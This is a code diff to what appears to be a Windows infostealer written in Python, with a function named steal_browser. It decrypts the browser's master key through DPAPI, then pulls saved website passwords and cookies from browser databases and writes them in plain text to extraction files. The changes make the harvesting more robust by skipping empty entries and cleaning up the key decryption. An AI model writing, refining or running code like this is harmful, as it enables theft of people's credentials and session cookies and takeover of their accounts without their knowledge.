@@ -155,11 +155,14 @@ BROWSERS = {
 }
 
 def get_key(path):
+    """Return raw AES key for v10/v11 decryption."""
     try:
         with open(os.path.join(path, "Local State"), "r", encoding="utf-8", errors="ignore") as f:
-            key = base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:]
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-    except:
+            encrypted_key_b64 = json.load(f)["os_crypt"]["encrypted_key"]
+        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # strip DPAPI prefix
+        # Decrypt once with DPAPI → gives you real AES key
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except Exception as e:
         return None
 
 def decrypt(buff, key):
@@ -194,7 +197,11 @@ def steal_browser():
                     c.execute("SELECT origin_url, username_value, password_value FROM logins")
                     with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as f:
                         for row in c.fetchall():
-                            f.write(f"[{name}] {row[0]} | {row[1]} | {decrypt(row[2], key)}\n")
+                            # Skip empty password blobs
+                            if not row[2]:
+                                continue
+                            decrypted_pw = decrypt(row[2], key)
+                            f.write(f"[{name}] {row[0]} | {row[1]} | {decrypted_pw}\n")
                 except: pass
                 c.connection.close()
                 os.remove("tmp_pwd.db")
@@ -226,6 +233,8 @@ def steal_browser():
                     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                     with open(os.path.join(EXTRACT_FOLDER, "cookies.txt"), "a", encoding="utf-8", errors="ignore") as f:
                         for host, name_, enc_val in cursor.fetchall():
+                            if not enc_val:
+                                continue
                             decrypted = decrypt(enc_val, key)
                             f.write(f"[{name}] {host} | {name_} = {decrypted}\n")
                     conn.commit()
